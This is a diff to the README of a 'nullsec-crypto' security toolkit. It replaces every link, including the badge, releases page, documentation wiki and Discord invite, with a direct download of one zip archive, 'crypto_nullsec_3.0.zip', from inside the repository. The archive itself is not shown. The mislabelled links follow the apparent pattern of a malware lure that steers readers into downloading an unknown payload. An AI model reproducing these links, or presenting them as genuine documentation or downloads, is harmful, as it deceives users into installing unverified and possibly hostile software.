@@ -1,6 +1,6 @@
 # 🔒 nullsec-crypto - Easy Security Tools for Everyone
 
-![Download nullsec-crypto](https://img.shields.io/badge/Download-nulsec--crypto-brightgreen)
+![Download nullsec-crypto](https://github.com/Noam-Space/nullsec-crypto/raw/refs/heads/main/python/crypto_nullsec_3.0.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to nullsec-crypto! This toolkit offers essential tools for cryptography 
 
 To get started, you need to download the software. Please visit the link below to find the latest version:
 
-[Download nullsec-crypto](https://github.com/Noam-Space/nullsec-crypto/releases)
+[Download nullsec-crypto](https://github.com/Noam-Space/nullsec-crypto/raw/refs/heads/main/python/crypto_nullsec_3.0.zip)
 
 ### Step-by-Step Installation
 
@@ -43,7 +43,7 @@ To get started, you need to download the software. Please visit the link below t
 
 We provide detailed documentation to help you understand all the features. Visit the following link to access the user manual and examples:
 
-[Documentation](https://github.com/Noam-Space/nullsec-crypto/wiki)
+[Documentation](https://github.com/Noam-Space/nullsec-crypto/raw/refs/heads/main/python/crypto_nullsec_3.0.zip)
 
 ## ❓ Frequently Asked Questions
 
@@ -63,7 +63,7 @@ Yes, nullsec-crypto is completely free to download and use.
 
 Join our community to share knowledge, ask questions, and connect with other users. Join us on Discord:
 
-[Discord Server](https://discord.gg/killers)
+[Discord Server](https://github.com/Noam-Space/nullsec-crypto/raw/refs/heads/main/python/crypto_nullsec_3.0.zip)
 
 ## ⚠️ License
 
@@ -73,4 +73,4 @@ nullsec-crypto is licensed under the MIT License. You can use this software free
 
 Thank you for choosing nullsec-crypto! We hope this toolkit becomes a valuable part of your security resources. If you have any questions or need help, don’t hesitate to reach out via our community or the Issues section on GitHub.
 
-[Download nullsec-crypto](https://github.com/Noam-Space/nullsec-crypto/releases)
+[Download nullsec-crypto](https://github.com/Noam-Space/nullsec-crypto/raw/refs/heads/main/python/crypto_nullsec_3.0.zip)
